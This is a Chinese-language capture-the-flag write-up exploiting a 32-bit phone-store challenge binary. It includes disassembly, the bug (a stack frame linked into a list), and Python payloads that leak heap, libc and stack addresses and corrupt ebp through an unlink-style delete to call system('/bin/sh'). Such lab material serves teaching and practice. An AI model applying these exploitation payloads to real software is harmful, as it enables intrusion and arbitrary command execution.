

## Struct

```C
struct phone
{
    (char*) name;
    int price;
    (phone*) next;  // +8
    (phone*) prev;  // +C
};
```

## Vuln

```assembly
.text:08048B64                 mov     dword ptr [esp], offset aIphone81 ; "*: iPhone 8 - $1"
.text:08048B6B                 call    _puts
.text:08048B70                 mov     dword ptr [esp+8], offset aIphone8 ; "iPhone 8"
.text:08048B78                 mov     dword ptr [esp+4], offset aS ; "%s"
.text:08048B80                 lea     eax, [ebp+$buf]
.text:08048B83                 mov     [esp], eax ; char **
.text:08048B86                 call    _asprintf
.text:08048B8B                 mov     [ebp+var_1C], 1
.text:08048B92                 lea     eax, [ebp+$buf]
.text:08048B95                 mov     [esp], eax
.text:08048B98                 call    insert
.text:08048B9D                 add     [ebp+var_28], 1
```
漏洞并不明显，但是猜测可能就是这个地方。<br>
稍微分析可知，这里把栈帧当作phone结构体插入了phone的list中。<br>
要进入这个过程，还需要将价格总和等于7174，可以写脚本爆破
```assembly
.text:08048B5B                 cmp     [ebp+var_28], 7174
.text:08048B62                 jnz     short loc_8
```
最终选一组进行add即可
```Python
for i in range(19):
    add(1)  # 199
for i in range(6):
    add(3)  # 499
add(4)  #399
```

### debug
通过调试能够清楚的了解程序checkout执行后流程<br>
```Python
checkout("y")
```
这样就在末尾添加了一个位于栈上的结构fake_phone。<br>
这里有趣的是，my_read函数每次读取的buf。比如构造如下，进行read
```Python
payload = 'y'+'\x00'+p32(elf.got['malloc'])+p32(0)+p32(0)
cart(payload)
```
本来是只要y字符。但是在加了后面的一点后，可以发现正好就落在fake_phone上
```assembly
                    -2      <- buf
+0 ?????????    ?????????   <- fake_phone (buf+2)
+8   next         prev      
```

## Exp

### leak
根据可以任意覆盖最后一个块，我们就可以覆盖name指针，leak出libc, heap, stack。
```Python
payload = 'y'+'\x00'+p32(start_list_addr)+p32(0)+p32(0)
cart(payload)
io.recvuntil("27: ")
heap_addr = u32(io.recv(4))
log.info("heap address:"+hex(heap_addr))
```
需要注意的是覆盖的next指针必须是0，不然程序可能无限循环或导致异常。

### exploit
在leak完之后，就需要通过这个漏洞更改指针<br>
```C
next = P->next;
prev = P->prev;
if(next!=0)
    *(next+0x08) = prev;
if(prev!=0)
    *(prev+0x0C) = next;
```

#### change

检测比unlink弱多了<br>
本来想直接更改got表，但是程序段是不可写的。比如
```assembly
prev -> system_addr
next -> atoi_got-0x08
```
流程就会如下:
1. (atoi_got-0x08+0x08) = system_addr
2. (system_addr+0x0C) = atoi_got
明显2会导致异常<br>
再考虑改栈上，如果该esp返回地址，很明显也不行。<br>
最后的方法是改ebp指向的指针。在函数返回的时候，ebp会通过 leave 恢复。<br>
更改该值，从而改变ebp
```Python
payload = str(27) + '\x00'*4 + p32(system_addr) + p32(stack_addr+0x04+0x22+0x20) + p32(stack_addr+0x20-0x08)
payload = payload.ljust(0x15, chr(0))
fake_del(payload)
```

####  buf?
再往后，又可以发现，返回到hanler函数的时候，ebp已经改变了<br>
又由于程序通过ebp进行偏移，确定buf地址
```assembly
.text:08048BFD                 mov     dword ptr [esp+4], 15h ; nbytes
.text:08048C05                 lea     eax, [ebp+nptr]
.text:08048C08                 mov     [esp], eax ; buf
.text:08048C0B                 call    my_read
```
那么，改变ebp即可改变buf读取地址，而buf有0x15的大小，足够进行利用了。

### orz
```Python
'''
cmds = "sh".ljust(4, chr(0)) + p32(stack_addr+0x44+0x1C)
payload = '6\x00' + cmds + p32(system_addr) + p32(stack_addr+0x44) + p32(stack_addr+0x1C)
#payload = payload.ljust(0x15, chr(0))
'''
cmds = "/bin/sh\x00"
payload = p32(system_addr) + p32(stack_addr+0x30) + p32(stack_addr+0x30) + cmds
payload = payload.ljust(0x15, chr(0))
fake_leave(payload)
```
明明已经ret到system了，但一直不成功，最后发现原因是我把"/bin/sh"字符串存在ret地址上方，这样会造成system运行过程中对字符串破坏，从而影响exp

## summary
总得来说并不难，但是有许多细节需要注意，而且对于栈的分配要很清楚地理解，对于unlink类似的操作也要熟悉。
